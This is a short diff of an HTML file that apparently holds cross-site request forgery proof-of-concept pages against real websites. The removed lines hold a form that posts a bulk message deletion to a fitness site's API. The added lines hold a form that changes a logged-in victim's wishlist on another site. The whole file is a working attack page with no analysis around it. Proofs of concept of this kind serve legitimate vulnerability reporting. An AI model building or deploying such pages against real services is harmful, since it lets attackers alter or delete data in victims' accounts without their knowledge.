@@ -1,17 +1,11 @@
-<!doctype html>
 <html>
-  <head><meta charset="utf-8"><title>CSRF PoC — bulk_delete (generic)</title></head>
-  <body>
-    <h3>CSRF PoC — bulk_delete (replace placeholders)</h3>
+<body>
+<h3>Click the button to trigger the CSRF request silently.</h3>
 
-    <form action="https://www.myfitnesspal.com/api/services/messages/bulk_delete" method="POST">
-      <!-- Repeat item[] for each item id -->
-      <input type="hidden" name="item[]" value="216774385">
-      <!-- sent field as in your example -->
-      <input type="hidden" name="sent" value="true">
-      <button type="submit">Send PoC (click to run)</button>
-    </form>
+<form action="https://www.mydirtyhobby.com/wishlist/manage/item/12308131/1/videoplayer" method="POST">
+    <button type="submit">Trigger Wishlist Change</button>
+</form>
 
-    <p>Notes: If the server strictly requires JSON in the request body, this form may fail — that's expected.</p>
-  </body>
+<p><i>Victim's wishlist will be modified if logged in.</i></p>
+</body>
 </html>
